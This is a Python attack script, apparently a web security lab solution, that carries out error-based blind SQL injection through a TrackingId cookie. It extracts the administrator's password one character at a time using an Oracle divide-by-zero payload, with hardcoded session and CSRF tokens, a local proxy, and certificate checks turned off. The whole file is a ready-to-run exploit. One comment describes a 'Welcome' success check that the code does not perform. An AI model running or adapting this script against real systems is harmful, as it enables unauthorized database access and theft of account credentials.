from bs4 import BeautifulSoup
import requests
import sys
import urllib3  # disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def blind_sqli(url):
    proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
        }

    password_extracted = ""
    try:
        for i in range(1, 20+1): # Password length found by manual testing
            for j in range(32, 126): # ASCII rotation range 
                payload = f"TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,{i},1))='{j}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
                encoded_payload = requests.utils.quote(payload) # URL encoding the payload
                
                cookie = {
                    "TrackingId":f"vRnkYeSIvSdjZYYE{encoded_payload}", 
                    "session":"UqXzQvC5l0n74DOQk50UhwzvBHvmADzF"
                    }
                
                data = {
                    "csrf":"438rUrSERplGhl30gSnHNtrfzpquiWKY", # Modify this csrf token to the one you get from the website.
                    "username":"administrator", 
                    "password":"password"
                    }

                response = requests.post(url, cookies=cookie, data=data, verify=False, proxies=proxies) # You can disable the proxy if you want it to be faster.
                # if "Welcome" is in the html response, then the letter j on position i is correct. 
                # If it's correctm we break the loop and continue on position 2 of i, etc.. 
                if response.status_code == 500:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
                
                else:
                    sys.stdout.write('\r' + chr(j))
                    #print('not correct')
                    sys.stdout.flush()

        print()
    
    except Exception as e:
        print(e)
        sys.exit(1)

    except KeyboardInterrupt:
        print("\n[-] Exiting the program")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} https://URL/")
        sys.exit(1)
    
    print("[+] Extracting the password of the admin")
    print("[+] Please be patient..")
    url = sys.argv[1]
    blind_sqli(url)
    

            

